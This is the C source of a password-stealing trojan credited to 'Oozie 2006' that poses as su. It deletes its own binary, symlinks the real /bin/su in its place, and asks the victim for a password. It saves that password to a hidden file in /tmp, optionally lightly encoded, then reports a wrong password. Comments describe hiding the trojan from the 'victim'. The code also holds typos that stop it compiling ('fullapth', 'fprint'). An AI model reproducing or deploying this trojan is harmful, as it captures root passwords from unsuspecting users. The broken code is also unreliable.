/*
  Credit to: Oozie 2006
*/

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>

#define LOG "/tmp/.pwd.log"
#define SU "/bin/su"

#ifdef CRYPTO
#define CRYPTO 1
#endif
#ifndef CRYPTO
#define CRYPTO 0
#endif

/* This is not part of this programme,
   it just a PoC of how-to decrypt the password encrytio.
   
char *decrypt (char *string2) {
	int i;

	for (i = 0; i < strlen (string2); i += 2)
		string2 [i]--;
	for (i = 1; i < strlen (string2); i += 2)
		string2 [i]++;

	return string2;
}
*/

char *encrypt (char *string) {
	int i;

	for (i = 0; i < strlen (string); i += 2)
		string [i]++;
	for (i = 1; i < strlen (string); i += 2)
		string [i]--;

	return string;
}

int main (int argc, char **argv) {
	char passwd [256];
	char *path, *newpath, *token, *fullpath;
	struct stat *buf;
	FILE *pwdfile;
	int fd, lock = 0;

	path = (char *)malloc (1024);
	newpath = (char *)malloc (1024);
	fullpath = (char *)malloc (256);

	path = getenv ("PATH");
	token = strtok (path,":");

	do {

		if (lock == 0) {
			strcpy (fullapth, token);
			strcat (fullpath, "/");
			strcat (fullapth, argv [0]);

			if (!(remove (fullpath))) {
				strcpy (newpath, fullpath);
				lock = 1;
			}
		}
	} while (token = strtok (NULL, ":"));
	symlink (SU, newpath);
	/* [!] Important
	   symbolic link must be made binary is gone.
	   After the original. Otherwise, the victim
	   executing su once again can see the full path
	   to non-existent trojan followed by an error
	   message -- We don't want that happen!
	*/

	strncpy (passwd, getpass ("Password: "), 256);
	pwdfile = fopen (LOG, "w");
	if (CRYPTO) encrypt (passwd);
	fprint (pwdfile, "%s\n", passwd);
	fclose (pwdfile);

	sleep (3);
	printf ("%s: incorrect password\n", argv [0]);
	return 0;
}
	
	
	
	
	
	
	
	
	
	
	  
					   
			
			
				   
	
	
	
	
	
	
	
	
	
		 
	
		
		
		
		
		
